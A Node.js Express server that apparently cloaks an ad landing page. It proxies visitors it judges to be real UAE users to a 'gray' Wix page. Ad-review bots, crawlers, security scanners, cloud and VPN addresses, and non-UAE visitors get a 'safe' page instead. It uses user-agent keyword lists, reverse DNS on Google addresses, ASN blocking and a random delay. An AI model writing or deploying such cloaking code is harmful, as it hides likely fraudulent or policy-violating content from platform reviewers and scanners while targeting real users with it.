const express = require("express");
const app = express();
const axios = require("axios");
const dns = require("dns");
const requestIp = require("request-ip");

// --- Configuration ---
const PORT = process.env.PORT || 10000;

const SAFE_PAGE = process.env.SAFE_PAGE || "https://yasislandemiratis.wixstudio.com/website-3/seaha";
const GRAY_PAGE = process.env.GRAY_PAGE || "https://yasislandemiratis.wixstudio.com/website-3/emaratise";

const UAE_COUNTRY_CODE = "AE";

// --- Trust proxy for correct IP detection ---
app.set("trust proxy", true);

// --- Bot Keywords ---
const BOT_KEYWORDS = [
  "adsbot", "googlebot", "mediapartners-google", "bingbot", "yandexbot", "baiduspider",
  "crawler", "spider", "render", "wget", "curl", "python-requests", "node-fetch",
  "monitor", "uptimerobot", "pingdom", "gtmetrix", "lighthouse",
  "facebookexternalhit", "slackbot", "telegrambot", "discordbot", "preview",
  "ahrefsbot", "semrushbot", "mj12bot", "dotbot", "petalbot", "rogerbot", "exabot",
  "sitecheckerbot", "screaming frog", "netcraftsurvey", "prerender", "headlesschrome",
  "bot", "scanner", "analyzer", "validator", "parser", "scraper"
];

// --- Suspicious User-Agents ---
const SUSPICIOUS_AGENTS = [
  "headlesschrome", "phantomjs", "puppeteer", "axios", "curl", "fetch", "python"
];

// --- Blocked ASN/Org List ---
function isBlockedASN(asn, orgName) {
  const BLOCKED_ASNS = [
    "AS15169", // Google
    "AS16509", // AWS
    "AS14061", // DigitalOcean
    "AS9009",  // M247
    "AS24940", // Hetzner
    "AS61317", // OVH
    "AS12876", // Online.net
    "AS14618"  // Amazon legacy
  ];

  const BLOCKED_KEYWORDS = [
    "google", "amazon", "aws", "digitalocean", "ovh", "m247", "hetzner", "vpn"
  ];

  const asnBlocked = asn && BLOCKED_ASNS.includes(asn.toUpperCase());
  const orgBlocked = orgName && BLOCKED_KEYWORDS.some(word => orgName.toLowerCase().includes(word));

  return asnBlocked || orgBlocked;
}

// --- Bot Detection Function ---
async function isBot(req) {
  const ua = (req.headers["user-agent"] || "").toLowerCase();
  const ip = req.clientIp || req.ip;

  const isUserAgentBot = BOT_KEYWORDS.some(bot => ua.includes(bot));
  if (isUserAgentBot) return true;

  const hasCommonHeaders = (
    req.headers["accept"] &&
    req.headers["accept-language"] &&
    req.headers["accept-encoding"]
  );
  if (!hasCommonHeaders) return true;

  const isGoogle = await isGoogleRelatedIP(ip);
  return isGoogle;
}

// --- Check if IP is Google Related ---
async function isGoogleRelatedIP(ip) {
  return new Promise(resolve => {
    if (!ip) return resolve(false);
    dns.reverse(ip, (err, hostnames) => {
      if (err) return resolve(false);
      const isGoogle = hostnames.some(h =>
        h.endsWith(".googlebot.com") ||
        h.endsWith(".google.com") ||
        h.endsWith(".googleusercontent.com")
      );
      resolve(isGoogle);
    });
  });
}

// --- Check Real User ---
function isLikelyRealUser(req) {
  const ua = (req.headers["user-agent"] || "").toLowerCase();
  const headers = req.headers;

  const basicHeaders = (
    headers["accept"] &&
    headers["accept-language"] &&
    headers["accept-encoding"]
  );

  const isSuspicious = SUSPICIOUS_AGENTS.some(key => ua.includes(key));
  const hasReferrer = headers["referer"] || headers["referrer"];
  // Removed cookie requirement for better social media support

  return (
    ua.includes("mozilla") &&
    basicHeaders &&
    !ua.includes("bot") &&
    !ua.includes("google") &&
    !isSuspicious &&
    hasReferrer
  );
}

// --- Proxy Content ---
async function proxyContent(targetUrl, req, res) {
  try {
    const headersToForward = {
      "User-Agent": req.headers["user-agent"],
      "Accept": req.headers["accept"],
      "Accept-Encoding": req.headers["accept-encoding"],
      "Accept-Language": req.headers["accept-language"],
    };

    const axiosConfig = {
      method: req.method,
      url: targetUrl + req.url,
      responseType: "stream",
      headers: headersToForward,
      validateStatus: () => true,
    };

    if (["POST", "PUT", "PATCH"].includes(req.method)) {
      axiosConfig.data = req.body;
    }

    const response = await axios(axiosConfig);

    for (const key in response.headers) {
      const value = response.headers[key];
      if (!["connection", "keep-alive", "proxy-authenticate", "proxy-authorization", "te", "trailers", "transfer-encoding", "upgrade", "host"].includes(key.toLowerCase())) {
        res.setHeader(key, value);
      }
    }

    res.status(response.status);
    response.data.pipe(res);
  } catch (error) {
    console.error(`❌ Proxy error to ${targetUrl}:`, error.message);
    res.status(500).send("Internal Server Error");
  }
}

// --- Middleware ---
app.use(requestIp.mw());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// --- Main Route Handler ---
app.all("*", async (req, res) => {
  const ip = req.clientIp || req.ip || "no-ip";
  const ua = req.headers["user-agent"] || "no-agent";
  const path = req.originalUrl;
  const referrer = req.headers["referer"] || req.headers["referrer"] || "none";

  let countryCode = null;
  let asn = null;
  let orgName = null;

  try {
    const ipData = await axios.get(`https://ipapi.co/${ip}/json/`);
    countryCode = ipData.data.country_code;
    asn = ipData.data.asn;
    orgName = ipData.data.org;

    console.log(`🌍 IP Info - IP: ${ip} | Country: ${countryCode} | ASN: ${asn} | Org: ${orgName}`);
  } catch (err) {
    console.error(`🌐 GeoIP lookup failed for IP ${ip}:`, err.message);
  }

  const isFromUAE = countryCode === UAE_COUNTRY_CODE;
  const isDetectedBot = await isBot(req);
  const isRealUser = isLikelyRealUser(req);
  const isASNBlocked = isBlockedASN(asn, orgName);

  console.log(`🔎 Referrer: ${referrer}`);
  console.log(`🧠 Decision: From UAE? ${isFromUAE} | Bot? ${isDetectedBot} | Real User? ${isRealUser} | ASN Blocked? ${isASNBlocked}`);

  await new Promise(resolve => setTimeout(resolve, Math.floor(Math.random() * 500) + 100));

  if (isFromUAE && !isDetectedBot && isRealUser && !isASNBlocked) {
    console.log("✅ Redirecting to GRAY_PAGE");
    await proxyContent(GRAY_PAGE, req, res);
  } else {
    console.log("🔒 Redirecting to SAFE_PAGE");
    await proxyContent(SAFE_PAGE, req, res);
  }
});

// --- Start Server ---
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`- GRAY_PAGE: ${GRAY_PAGE}`);
  console.log(`- SAFE_PAGE: ${SAFE_PAGE}`);
});
